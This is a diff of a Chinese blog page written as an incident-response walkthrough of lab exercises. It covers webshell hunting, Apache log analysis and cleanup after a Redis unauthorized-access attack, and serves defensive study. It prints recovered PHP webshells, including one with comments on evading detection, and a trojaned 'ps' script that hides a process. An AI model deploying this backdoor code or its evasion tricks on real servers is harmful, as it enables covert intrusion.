@@ -7,19 +7,10 @@
   <meta http-equiv="expires" content="0">
   
   <title>应急响应基础 | Qexzi&#39;s Blog</title>
+  <link rel="canonical" href="https://Qexzi.github.io/2026/10/11/应急响应基础/">
   <meta name="author" content="Qexzi">
   
-  <meta name="description" content="前言补一下应急响应相关知识
-
-一、通用基础知识1. WebShell 应急响应核心要解决 5 件事
-找到 WebShell 木马文件：找出服务器上全部的后门脚本
-攻击溯源：黑客什么时候上传 webshell？攻击者 IP 是什么？
-还原行为：黑客上传木马后干了什么：读文件、拿数据、创建账号、留持久化后门
-清除威胁：删除 WebShell，清除黑客留下的其他后门
-修复漏洞：黑客是通过什么漏洞传上来的（文件上传漏洞、SQL 注入、后台 Getshell 等），封堵漏洞，防止再次被入侵。
-
-2. WebShell 检测方法2.1 静态特征检测我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。
-然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。"> 
+  <meta name="description" content="网络安全学习笔记：Web 渗透、内网攻防、CTF、PWN 与计算机基础知识">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -32,6 +23,8 @@
   
 
   
+    <link rel="alternative" href="/atom.xml" title="Qexzi&#39;s Blog" type="application/atom+xml">
+  
   
     <link href="/zhuzhuxia.png" rel="icon">
   
@@ -42,7 +35,6 @@
   <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
@@ -50,41 +42,39 @@
 
   <!-- analytics -->
   
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-70812759-1');
-</script>
 
 
 
 
-
-
-<meta name="generator" content="Hexo 8.1.1"><script>
-MathJax = {
-  tex: {
-    inlineMath: [['$', '$'], ['\\(', '\\)']],
-    displayMath: [['$$', '$$'], ['\\[', '\\]']],
-    processEscapes: true,
-    processEnvironments: true
-  },
-  options: {
-    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-  },
-  startup: {
-    pageReady: () => {
-      return MathJax.startup.defaultPageReady();
+  
+  <!-- MathJax（仅含公式的页面加载，由 scripts/mathjax-injector.js 检测标记） -->
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    startup: {
+      pageReady: () => {
+        return MathJax.startup.defaultPageReady();
+      }
     }
-  }
-};
-</script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-</head>
+  };
+  </script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  
+
+  
+  <!-- 结构化数据：帮助搜索引擎理解文章元信息 -->
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"应急响应基础","datePublished":"2026-10-11T04:00:00.000Z","dateModified":"2026-10-11T04:00:00.000Z","author":{"@type":"Person","name":"Qexzi"},"mainEntityOfPage":"https://Qexzi.github.io/2026/10/11/应急响应基础/","description":"前言补一下应急响应相关知识 一、通用基础知识1. WebShell 应急响应核心要解决 5 件事 找到 WebShell 木马文件：找出服务器上全部的后门脚本 攻击溯源：黑客什么时候上传 webshell？攻击者 IP 是什么？ 还原行为：黑客上传木马后干了什么：读文件、拿数据、创建账号、留持久化后门 清除威胁：删除 WebShell，清除黑客留下的其他后门 修复漏洞：黑客是通过什么漏洞传上来的（"}</script>
+  
+
+<meta name="generator" content="Hexo 8.1.1"></head>
 
  <body>  
   <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
@@ -732,7 +722,7 @@ MathJax = {
 <p>执行指令：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_1.png" alt="在这里插入图片描述"><br>这就找到三个webshell</p>
+<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_1.png" alt="应急响应基础·图1"><br>这就找到三个webshell</p>
 <p><code>cat ./include/gz.php</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span></span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -745,7 +735,7 @@ MathJax = {
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>很显然，这就是隐藏的后门</p>
 <p>直接执行 <code>echo -n &quot;/var/www/html/include/Db/.Mysqli.php&quot; | md5sum</code> 即可得到：<code>flag{aebac0e58cd6c5fad1695ee4d1ac1919}</code></p>
-<p>查看日志<br>发现带有很奇怪的请求参数日志记录<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_2.png" alt="在这里插入图片描述"><br>还有<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_3.png" alt="在这里插入图片描述"><br>谁家好人传这种参数，所以问题在 <code>/var/www/html/wap</code> 目录下</p>
+<p>查看日志<br>发现带有很奇怪的请求参数日志记录<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_2.png" alt="应急响应基础·图2"><br>还有<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_3.png" alt="应急响应基础·图3"><br>谁家好人传这种参数，所以问题在 <code>/var/www/html/wap</code> 目录下</p>
 <p>cat index.php 发现没什么， 然后<code>cat top.php</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 异或加密/解密使用的密钥，长度为 8</span></span><br><span class="line"><span class="comment">// 字符串 &quot;password&quot; 的索引：0:p, 1:a, 2:s, 3:s, 4:w, 5:o, 6:r, 7:d</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注释中隐藏的 Payload：ERsDHgEUC1hI</span></span><br><span class="line"><span class="comment">// 这是经过 Base64 编码后再异或加密的数据</span></span><br><span class="line"><span class="comment">// 解码解密后得到：phpinfo()</span></span><br><span class="line"><span class="comment">// 免杀思路：把真实 Payload 放在注释里，避免直接暴露敏感字符串</span></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 GET 参数 func 中获取 Base64 编码的数据并解码</span></span><br><span class="line"><span class="comment">// 注意：攻击者实际利用时可能故意写错参数名（如 fuc），导致 $fun 为空</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对解码后的数据进行异或解密</span></span><br><span class="line"><span class="comment">// $key[$i+1&amp;7] 等价于 $key[($i+1) &amp; 7]</span></span><br><span class="line"><span class="comment">// 即循环取密钥字符，索引顺序为：1,2,3,4,5,6,7,0 -&gt; a,s,s,w,o,r,d,p</span></span><br><span class="line"><span class="comment">// 免杀思路：使用异或加密，隐藏真实 Payload</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面通过字符串拼接动态构造函数名，避免直接出现敏感函数名</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $c = &quot;a&quot; . &quot;s&quot; . $_GET[&quot;func2&quot;]</span></span><br><span class="line"><span class="comment">// 若 func2=sert，则 $c = &quot;assert&quot;</span></span><br><span class="line"><span class="comment">// 若 func2 其他值，则可能拼出其他函数名</span></span><br><span class="line"><span class="comment">// 免杀思路：拆分敏感函数名，绕过关键词检测</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> . <span class="variable">$s</span> . <span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态调用拼接出来的函数，并将解密后的 $fun 作为参数传入</span></span><br><span class="line"><span class="comment">// 例如 $c = &quot;assert&quot; 时，相当于执行 assert($fun)</span></span><br><span class="line"><span class="comment">// 这是典型的免杀手法：变量函数、字符串拼接、动态执行</span></span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -759,7 +749,7 @@ MathJax = {
 <li>查看黑客IP访问了多少次，提交次数：</li>
 <li>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数</li>
 </ol>
-<p><code>cat /var/log/apache2/access.log.1</code> 查看了一下日志信息，发现第一列就是ip<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_4.png" alt="在这里插入图片描述"><br>则有：</p>
+<p><code>cat /var/log/apache2/access.log.1</code> 查看了一下日志信息，发现第一列就是ip<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_4.png" alt="应急响应基础·图4"><br>则有：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c </span><br><span class="line"></span><br><span class="line">次数 ::1</span><br><span class="line">次数 192.168.200.2</span><br><span class="line">略</span><br></pre></td></tr></table></figure>
 <p>所以黑客ip就是192.168.200.2，即<code>flag{192.168.200.2}</code></p>
 <p>对于指纹信息：</p>
@@ -778,7 +768,7 @@ MathJax = {
 <p>即 <code>flag{6555}</code></p>
 <p>最后一个</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log.1 | grep  -aP <span class="string">&quot;03/Aug/2023:08:&quot;</span> | grep -aP <span class="string">&quot;^\d+\.\d+\.\d+\.\d+ - -&quot;</span> |  awk <span class="string">&quot;&#123;print <span class="variable">$1</span>&#125;&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log.1 | grep  -aP <span class="string">&quot;03/Aug/2023:08:&quot;</span> | grep -aP <span class="string">&quot;^\d+\.\d+\.\d+\.\d+ - -&quot;</span> |  awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log.1 | grep  -aP <span class="string">&quot;03/Aug/2023:08&quot;</span> |  awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log.1 | grep  -aP <span class="string">&#x27;03/Aug/2023:08&#x27;</span>  | grep -avP <span class="string">&#x27;^\d+\.\d+\.\d+\.\d+ - -&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_5.png" alt="在这里插入图片描述"><br>第一条指令awk语法错误，所以忽略。<br>正确的为 <code>flag{5}</code>，第二条指令排除了本机ip</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_5.png" alt="应急响应基础·图5"><br>第一条指令awk语法错误，所以忽略。<br>正确的为 <code>flag{5}</code>，第二条指令排除了本机ip</p>
 <hr>
 <h3 id="3-redis应急响应"><a href="#3-redis应急响应" class="headerlink" title="3. redis应急响应"></a>3. redis应急响应</h3><p><strong>任务：</strong></p>
 <ol>
@@ -791,15 +781,15 @@ MathJax = {
 <p>ssh连接之后的第一步就是查看redis的相关信息</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli INFO | grep <span class="string">&quot;redis_version&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/redis.log</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_6.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_6.png" alt="应急响应基础·图6"></p>
 <p>我们知道 4.x 与 5.x 是存在未授权访问带来的getshell风险的，具体原理以及复现转至文章：<a href="https://qexzi.github.io/2026/06/08/Redis4-unacc/">Redis-unacc</a></p>
 <p>所以第一步需要确定是否是没有设置密码：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/redis/redis.conf | grep <span class="string">&quot;requirepass&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_7.png" alt="在这里插入图片描述"><br>指数符号，确定是未授权</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_7.png" alt="应急响应基础·图7"><br>指数符号，确定是未授权</p>
 <p>查看日志：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/redis.log</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_8.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_8.png" alt="应急响应基础·图8"></p>
 <p>关键日志信息：</p>
 <ul>
 <li>MASTER &lt;-&gt; REPLICA sync started: 表示 Redis 副本（REPLICA）尝试与主服务器（MASTER）进行同步。</li>
@@ -811,26 +801,26 @@ MathJax = {
 
 <p>过滤日志，找到与 <code>MASTER</code> 相关的内容</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/redis.log | grep <span class="string">&quot;MASTER&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_9.png" alt="在这里插入图片描述"><br>找到两个ip，很明显攻击成功的ip是<code>192.168.100.20</code></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_9.png" alt="应急响应基础·图9"><br>找到两个ip，很明显攻击成功的ip是<code>192.168.100.20</code></p>
 <p>那我们怎么迅速找到黑客的恶意文件呢？ 根据其攻击逻辑，必然是要加载module，所以过滤module即可找到</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/redis.log | grep <span class="string">&quot;Module&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_10.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_10.png" alt="应急响应基础·图10"></p>
 <p><code>./exp.so</code> 说明是在redis的工作目录下，一般是<code>/</code> （实际上可以查看配置，但是我比较懒），直接：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;exp.so&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_11.png" alt="在这里插入图片描述"></p>
-<p>题目教我分析exp.so，还能怎么分析找到flag？不过就是Mice的基础’隐写’，也可以拉下来用101去分析，不过我太懒了<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_12.png" alt="在这里插入图片描述"><br>即 <code>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</code></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_11.png" alt="应急响应基础·图11"></p>
+<p>题目教我分析exp.so，还能怎么分析找到flag？不过就是Mice的基础’隐写’，也可以拉下来用101去分析，不过我太懒了<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_12.png" alt="应急响应基础·图12"><br>即 <code>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</code></p>
 <p>找反弹shell，我上面的文章提到过弹shell的持久化思路：定时任务</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_13.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_13.png" alt="应急响应基础·图13"></p>
 <p>即 <code>flag{192.168.100.13}</code></p>
 <p>ssh持久化，我上面的文章提到的思路：写入ssh公钥</p>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_14.png" alt="在这里插入图片描述"><br>用户：xj-test-user  然后这部分就是有点想脑筋急转弯</p>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_15.png" alt="在这里插入图片描述"><br>查看变更<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_16.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_14.png" alt="应急响应基础·图14"><br>用户：xj-test-user  然后这部分就是有点想脑筋急转弯</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_15.png" alt="应急响应基础·图15"><br>查看变更<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_16.png" alt="应急响应基础·图16"></p>
 <p>即<code>flag{xj-test-user-wow-you-find-flag}</code></p>
 <p>找篡改的命令，基础知识部分有排查命令的目录，一个一个跟踪</p>
-<p>挺无语的，打着打着靶场没了，重新启动又要金币，我就不启动了<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_17.png" alt="在这里插入图片描述"><br>参考别人的blog：<code>cd /usr/bin &amp;&amp; ls -al </code> 发现可以东西</p>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_18.png" alt="在这里插入图片描述"></p>
+<p>挺无语的，打着打着靶场没了，重新启动又要金币，我就不启动了<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_17.png" alt="应急响应基础·图17"><br>参考别人的blog：<code>cd /usr/bin &amp;&amp; ls -al </code> 发现可以东西</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_18.png" alt="应急响应基础·图18"></p>
 <p>然后<code>cat ps</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash                                          <span class="comment"># 指定解释器，实际应为 #!/bin/bash，此处缺少感叹号，但仍可被 shell 执行</span></span></span><br><span class="line">oldifs=&quot;$IFS&quot;                                       # 备份当前的 IFS（内部字段分隔符）变量</span><br><span class="line">IFS=&#x27;\$n&#x27;                                           # 将 IFS 修改为 \、$、n 三个字符（单引号内不转义），用于混淆</span><br><span class="line">result=$(ps_ $1 $2 $3|grep -v &#x27;threadd&#x27; )           # 调用被重命名后的原始 ps 命令 ps_，传入用户参数，并过滤掉包含 threadd 的行</span><br><span class="line">for v in $result;                                   # 遍历过滤后的每一行结果</span><br><span class="line">do</span><br><span class="line">        echo -e &quot;$v\t&quot;;                             # 输出该行内容，并在末尾添加一个制表符</span><br><span class="line">done</span><br><span class="line">IFS=&quot;$oldifs&quot;                                       # 恢复原来的 IFS 变量</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">//c195i2923381905517d818e313792d196                <span class="comment"># 注释行，内含 Flag：c195i2923381905517d818e313792d196</span></span></span><br></pre></td></tr></table></figure>
 
@@ -850,36 +840,36 @@ MathJax = {
 <p>审计日志</p>
